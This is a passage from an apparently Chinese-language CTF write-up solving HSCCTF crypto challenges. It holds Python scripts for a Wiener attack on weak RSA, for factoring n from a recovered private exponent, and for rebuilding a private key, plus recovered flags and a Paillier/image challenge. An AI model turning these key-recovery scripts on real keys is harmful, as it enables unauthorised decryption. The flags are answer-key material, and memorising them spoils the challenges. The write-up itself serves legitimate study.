class="number">1433461290183315706</span>, <span class="number">3240132019514117541</span>, <span class="number">2465292834002904411</span>, <span class="number">1334470694725903257</span>, <span class="number">3156578894981065904</span>, <span class="number">35185442949043438</span>, <span class="number">645993467993501426</span>, <span class="number">1352915688916657829</span>, <span class="number">1521946784078789166</span>, <span class="number">2639858512187877401</span>, <span class="number">4315064694485922395</span>, <span class="number">3953315792354490874</span>, <span class="number">1587769214913102261</span>, <span class="number">3912000075342935904</span>, <span class="number">1887499577531299413</span>, <span class="number">309657057763429254</span>, <span class="number">769590223035802807</span>, <span class="number">4361036733963754384</span>, <span class="number">1446528785602732156</span>, <span class="number">1205711736426995533</span>, <span class="number">3683188791797133788</span>, <span class="number">921287773622604679</span>, <span class="number">3591274357626650529</span>, <span class="number">2745859155549230842</span>, <span class="number">4491978210538609848</span>, <span class="number">2444128709624329128</span>, <span class="number">1403888264551474491</span>, <span class="number">4377727165055311964</span>, <span class="number">1507498290240201527</span>, <span class="number">2952796830041690744</span>, <span class="number">1642562262970195060</span>, <span class="number">2847743992975447391</span>, <span class="number">4164239208310834247</span>, <span class="number">1967003682977431435</span>, <span class="number">2575799088251274004</span>, <span class="number">156708464748056204</span>, <span class="number">2403917842083313594</span>, <span class="number">55721043545237639</span>, <span class="number">239916744182811448</span>, <span class="number">134638877854791156</span>, <span class="number">76687455444928683</span>, <span class="number">3051612621194354938</span>, <span class="number">4253947515818696559</span>, <span class="number">392166402534779315</span>, <span class="number">5415521347314633</span>, <span class="number">1816697745794261287</span>, <span class="number">2282876916808180261</span>, <span class="number">3667412627019328976</span>, <span class="number">4211876289328416715</span>, <span class="number">1647128252024708114</span>, <span class="number">3721877072126461741</span>, <span class="number">2297068963395433648</span>, <span class="number">398583411660274597</span>, <span class="number">3562855580894975650</span>, <span class="number">1322989240042277117</span>, <span class="number">3551729861626536144</span>, <span class="number">2816759739903316271</span>, <span class="number">2629395545611893101</span>, <span class="number">1799561289667084873</span>, <span class="number">2629410111371391637</span>, <span class="number">1398369600901640698</span>, <span class="number">447266788926484707</span>, <span class="number">405213767544537836</span>, <span class="number">3014220918160576578</span>, <span class="number">747208265285548041</span>, <span class="number">1727187447678753569</span>, <span class="number">3063564852472463780</span>, <span class="number">1502638600503176791</span>, <span class="number">3284205888928186113</span>, <span class="number">3412854446691461073</span>, <span class="number">3937011809364193960</span>, <span class="number">1208514509487198642</span>, <span class="number">3063044796627572289</span>, <span class="number">2532417142719581087</span>, <span class="number">375928502591586817</span>, <span class="number">2839325684818922862</span>, <span class="number">4472409225244809142</span>, <span class="number">1384186637673587546</span>, <span class="number">1680318030162086049</span>]</span><br><span class="line">t = [<span class="number">3482937270284373504</span>, <span class="number">3729542463939501056</span>, <span class="number">1354530592839269376</span>, <span class="number">2340035975483411456</span>, <span class="number">3318144666530505728</span>, <span class="number">4321971466042776576</span>, <span class="number">4107840020098758656</span>, <span class="number">2600042509314867200</span>, <span class="number">3185315495632337920</span>, <span class="number">2510425761632839680</span>, <span class="number">3758844697217568768</span>, <span class="number">1813627045100445696</span>, <span class="number">1035634427310004224</span>, <span class="number">1650895865179787264</span>, <span class="number">931858574122051584</span>, <span class="number">3821738968282525696</span>, <span class="number">751354306590687232</span>, <span class="number">812159733109825536</span>, <span class="number">1984846083975063552</span>, <span class="number">426674528748978176</span>, <span class="number">1786129270688538624</span>, <span class="number">53204613942820864</span>, <span class="number">4207648582990901248</span>, <span class="number">2441413890227052544</span>, <span class="number">4573249524143439872</span>, <span class="number">2901255116891488256</span>, <span class="number">3331287389413953536</span>, <span class="number">1594453621617430528</span>, <span class="number">7636565623463936</span>, <span class="number">3261865719383670784</span>, <span class="number">3211543945355886592</span>, <span class="number">4414864510393499648</span>, <span class="number">1781787468450406400</span>, <span class="number">4381257290165919744</span>, <span class="number">1683943310183464960</span>, <span class="number">1618102318685454336</span>, <span class="number">3082727664554508288</span>, <span class="number">1284750602156802048</span>, <span class="number">4536273674447527936</span>, <span class="number">4224428964375134208</span>, <span class="number">1990811212107251712</span>, <span class="number">220641709431201792</span>, <span class="number">56727929599156224</span>, <span class="number">1394394833783595008</span>, <span class="number">474539825790402560</span>, <span class="number">2367070412709519360</span>, <span class="number">86013256530493440</span>, <span class="number">3983263247386468352</span>, <span class="number">4488230536002330624</span>, <span class="number">1131832099054157824</span>, <span class="number">4470326732790874112</span>, <span class="number">2361104703887433728</span>, <span class="number">1850267988673478656</span>, <span class="number">519014833878171648</span>, <span class="number">2447115942472581120</span>, <span class="number">2567048274520276992</span>, <span class="number">3409815404144214016</span>, <span class="number">2569012418791473152</span>, <span class="number">2239861171203006464</span>, <span class="number">3207035079062069248</span>, <span class="number">1423032481934245888</span>, <span class="number">3660676895628648448</span>, <span class="number">3197924030326439936</span>, <span class="number">2173721402472767488</span>, <span class="number">1836499846562930688</span>, <span class="number">1193190307175825408</span>, <span class="number">2757965850888388608</span>, <span class="number">3833547905923039232</span>, <span class="number">113362523505639424</span>, <span class="number">2095507640221974528</span>, <span class="number">695818728283136000</span>, <span class="number">2746136108677742592</span>, <span class="number">80271849461956608</span>, <span class="number">544596706215608320</span>, <span class="number">857894362373431296</span>, <span class="number">1801819582386577408</span>, <span class="number">2748888436946362368</span>, <span class="number">1760827740054806528</span>, <span class="number">2544591920627023872</span>, <span class="number">4324861829346312192</span>, <span class="number">3073160513540464640</span>, <span class="number">3260750497480876032</span>, <span class="number">1268136159796920320</span>, <span class="number">2738758060057362432</span>, <span class="number">460370852221685760</span>, <span class="number">3694812482865025024</span>, <span class="number">674485732026892288</span>, <span class="number">31827325234905088</span>, <span class="number">1076067066569760768</span>, <span class="number">3538749128687951872</span>, <span class="number">4553745898606747648</span>, <span class="number">3332219178735149056</span>, <span class="number">329835532944998400</span>, <span class="number">4576690061027602432</span>, <span class="number">3023286444576161792</span>, <span class="number">1797946474203955200</span>, <span class="number">4558389623053447168</span>, <span class="number">1790588264296259584</span>, <span class="number">3017170271014150144</span>, <span class="number">991463616551034880</span>, <span class="number">1940023178234544128</span>, <span class="number">3414390445152993280</span>, <span class="number">644333657859764224</span>, <span class="number">3692106158122917888</span>, <span class="number">3167684436092710912</span>, <span class="number">789204772426006528</span>, <span class="number">4353661356398166016</span>, <span class="number">2000540208800374784</span>, <span class="number">3942168043465134080</span>, <span class="number">3332450567729246208</span>, <span class="number">2627875622523490304</span>, <span class="number">9371534919516160</span>, <span class="number">848644069081235456</span>, <span class="number">2192689498702295040</span>, <span class="number">907016265148577792</span>, <span class="number">2645935549696630784</span>, <span class="number">2590866188404383744</span>, <span class="number">3750676748846913536</span>, <span class="number">3694849270404139008</span>, <span class="number">4268369840164233216</span>, <span class="number">3556945000413347840</span>, <span class="number">1995615102316576768</span>, <span class="number">4445424004994387968</span>, <span class="number">2929133498761163776</span>, <span class="number">2462149674675616768</span>, <span class="number">741748174115656704</span>, <span class="number">39754566828455680</span>, <span class="number">4477497218304360448</span>]</span><br><span class="line">s = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">x = [(n-k)%n <span class="keyword">for</span> k <span class="keyword">in</span> v]</span><br><span class="line">res = add(w,mul(s,x,n,mod),n,mod)</span><br><span class="line"></span><br><span class="line">t1 = (res//(<span class="number">2</span>**<span class="number">30</span>))[:<span class="number">76</span>]</span><br><span class="line">t2 = (res%(<span class="number">2</span>**<span class="number">30</span>))[:<span class="number">76</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t1)):</span><br><span class="line">    <span class="keyword">if</span> t2[i] &gt; <span class="number">1000000</span>:</span><br><span class="line">        c += <span class="built_in">chr</span>(t1[i]+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c += <span class="built_in">chr</span>(t1[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(c,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HSCCTF&#123;vb6fh8gd7fy87jht7fgyt7g89gb9dn&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="RSATEST"><a href="#RSATEST" class="headerlink" title="RSATEST"></a>RSATEST</h3><p>给了公钥文件和密文，在线解析公钥得到 $n,e$，wiener attack求 $d$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="comment"># Converts a rational x/y fraction into a list of partial quotients [a0, ..., an]</span></span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="comment"># computes the list of convergents using the list of partial quotients</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)): convs.append(contfrac_to_rational(frac[<span class="number">0</span> : i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span> (frac):</span><br><span class="line">    <span class="comment"># Converts a finite continued fraction [a0, ..., an] to an x/y rational.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>: <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>): num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line">e = <span class="number">28590331496425613818981991777617535857151582651120346436859967760844419275658771430821058722393674433618893115968176611013590439492663850993790177381059077045197086133940118402088554088073121591402095323966107722485647643452801806511583327361664114727935171402256611877627071996643841223356362367747555753013</span></span><br><span class="line">n = <span class="number">82016816963574560365976489524199243050120748716806912567895093731022264392235286524041630435256965141365061465268083316572087612155218061280174438822024011254230300135794845491207820824129566975766207833561478897150955561714805950254000266078855648956964973181825856857736088834707915779351726709234357344729</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>: <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, _ = egcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_rsa</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if x*x - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">d = crack_rsa(e, n)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11883451304899715537</span></span><br></pre></td></tr></table></figure><p>根据 $n,e,d$ 分解 $p,q$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_pq</span>(<span class="params">e, d, n</span>):</span><br><span class="line">    k = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(<span class="number">2</span>, n-<span class="number">1</span>)</span><br><span class="line">        t = k</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t //= <span class="number">2</span></span><br><span class="line">            x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(x-<span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(x-<span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">return</span> (p, n//p)</span><br><span class="line">            </span><br><span class="line">e = <span class="number">28590331496425613818981991777617535857151582651120346436859967760844419275658771430821058722393674433618893115968176611013590439492663850993790177381059077045197086133940118402088554088073121591402095323966107722485647643452801806511583327361664114727935171402256611877627071996643841223356362367747555753013</span></span><br><span class="line">n = <span class="number">82016816963574560365976489524199243050120748716806912567895093731022264392235286524041630435256965141365061465268083316572087612155218061280174438822024011254230300135794845491207820824129566975766207833561478897150955561714805950254000266078855648956964973181825856857736088834707915779351726709234357344729</span></span><br><span class="line">c = <span class="number">0x1d1d98935d8bc395049b978b53ab72fc2c722f30b84bbf6c2bf3473320d040525bce59094840b229cf1fee0332c9dbcfc9cc07bf0841d2ec5f25b3f6a2868db433aca742d1e17a7b89f94412a77ea2f0ee3c30b53e250f77c44fd0e9c47bdfbfaa6dfe3f987409e9e6501962bf425cb686b570f922b843e30b4e96521c2dd296</span></span><br><span class="line">d=<span class="number">11883451304899715537</span></span><br><span class="line">p, q = divide_pq(e, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = 8281403040977025531549820722276265064745565654568438822912387430707467937623490534629221470348100185977195507167386055422519226694536400000080279834237671</span></span><br><span class="line"><span class="comment"># q = 9903734494958037799680839753815171083006157728210189116724935884147895459864893196164405513869856559603118560765385175174916229249053756596318108626734399</span></span><br></pre></td></tr></table></figure><p>生成私钥文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">e=<span class="number">28590331496425613818981991777617535857151582651120346436859967760844419275658771430821058722393674433618893115968176611013590439492663850993790177381059077045197086133940118402088554088073121591402095323966107722485647643452801806511583327361664114727935171402256611877627071996643841223356362367747555753013</span></span><br><span class="line">n=<span class="number">82016816963574560365976489524199243050120748716806912567895093731022264392235286524041630435256965141365061465268083316572087612155218061280174438822024011254230300135794845491207820824129566975766207833561478897150955561714805950254000266078855648956964973181825856857736088834707915779351726709234357344729</span></span><br><span class="line">c=<span class="number">0x1d1d98935d8bc395049b978b53ab72fc2c722f30b84bbf6c2bf3473320d040525bce59094840b229cf1fee0332c9dbcfc9cc07bf0841d2ec5f25b3f6a2868db433aca742d1e17a7b89f94412a77ea2f0ee3c30b53e250f77c44fd0e9c47bdfbfaa6dfe3f987409e9e6501962bf425cb686b570f922b843e30b4e96521c2dd296</span></span><br><span class="line">d=<span class="number">11883451304899715537</span></span><br><span class="line">p = <span class="number">8281403040977025531549820722276265064745565654568438822912387430707467937623490534629221470348100185977195507167386055422519226694536400000080279834237671</span></span><br><span class="line">q = <span class="number">9903734494958037799680839753815171083006157728210189116724935884147895459864893196164405513869856559603118560765385175174916229249053756596318108626734399</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rsa_components = (n, e, d, p, q)</span><br><span class="line">myrsa = RSA.construct(rsa_components)</span><br><span class="line"></span><br><span class="line">private = <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">private.write(myrsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>openssl解密：</p><p><code>openssl rsautl -decrypt -inkey private.pem -in output.txt</code></p><p>输出：<code>09C96E1A3ACC46E3C9F7603EB592FE4A</code></p><p>flag：<code>HSCCTF&#123;09C96E1A3ACC46E3C9F7603EB592FE4A&#125;</code></p><p>​    </p><h3 id="STAR-CHASING-DIARY"><a href="#STAR-CHASING-DIARY" class="headerlink" title="STAR_CHASING_DIARY"></a>STAR_CHASING_DIARY</h3><blockquote><p>crypto!图片?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>, q)</span><br><span class="line">n = p * q</span><br><span class="line">key = <span class="string">&#x27;********************&#x27;</span></span><br><span class="line">m = bytes_to_long(key.encode())</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">300</span></span><br><span class="line">r = randint(<span class="number">1</span>, n)</span><br><span class="line">c = (<span class="built_in">pow</span>(n + <span class="number">1</span>, m, n * n) * <span class="built_in">pow</span>(r, n, n * n)) % (n * n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = 7828612943367317778189697443061863547768704021648982642807960201410438190347546379219450386530108335470584219657007036386835647156694512102467911388214639</span></span><br><span class="line"><span class="comment"># q = 11560196429251786803557082533869761370530605728500211999842201987445533038949033226473164866960007192683170489064961432891988337343103657552186800680461299</span></span><br><span class="line"><span class="comment"># c = 768905250861905487717845092484035532140840941871031779930259407348955511757335716790249355464829607714399266689960353955065504221985891074636544161678177920296971444880997864168042745264256952808480926755620637239135808617643874771066244234690401223758004286234917537720362007827248701308605961814972773704288547887039586934111562590676930853945316673164146667949991176600280451163710564978897622310650541491271961315592017251211248379608602287809736613530069187936569470129814949302440734244885473716072898519354127964155042421376782226235081303957997587618278341829891036314980185040102049478608445519994654780162</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># task.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">小肖在学习的过程中,了解到了一种填充图片的算法,兴奋的她用它和RSA加密了偶像的照片,</span></span><br><span class="line"><span class="string">但是在传输的过程中丢失了一部分加密算法,你能帮她补全,并解出来偶像的照片吗?</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">n, x, y</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    m = <span class="number">1</span> &lt;&lt; (n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">j = <span class="number">128</span></span><br><span class="line">mm = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>):</span><br><span class="line">        mm.append(f(j, i, s) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br><span class="line">pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">data = [pixel <span class="keyword">for</span> pixel <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;key.png&#x27;</span>)</span><br><span class="line">pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">png_key = [pixel <span class="keyword">for</span> pixel <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0</span>] * <span class="number">65536</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    enc[i] = data[mm[i]]</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    enc[s] = enc[s] ^ png_key[s]</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&#x27;L&#x27;</span>, (<span class="number">256</span>, <span class="number">256</span>))</span><br><span class="line">image.putdata(enc)</span><br><span class="line">image.save(<span class="string">&#x27;enc.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>先看 key.py，Paillier密码系统：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">7828612943367317778189697443061863547768704021648982642807960201410438190347546379219450386530108335470584219657007036386835647156694512102467911388214639</span></span><br><span class="line">q = <span class="number">11560196429251786803557082533869761370530605728500211999842201987445533038949033226473164866960007192683170489064961432891988337343103657552186800680461299</span></span><br><span class="line">c = <span 